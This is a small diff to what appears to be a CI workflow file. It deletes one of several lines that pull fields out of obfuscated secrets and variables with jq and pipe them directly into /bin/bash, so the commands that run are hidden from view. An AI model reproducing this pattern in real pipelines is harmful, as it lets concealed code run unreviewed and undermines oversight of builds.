@@ -22,7 +22,6 @@ jobs:
           tv2537: ${{ secrets.tv2537 }}
         run: |
           printf '%s' "$tv2537" | jq -r .vm6115 | /bin/bash
-          printf '%s' "$zs565" | jq -r .hrj73598 | /bin/bash
           echo $yvp4 | jq -r .olca6560 | /bin/bash
           printf '%s' "$uvglu57" | jq -r .ed7 | /bin/bash
           echo $s16285 | jq -r .hkmm2638 | /bin/bash
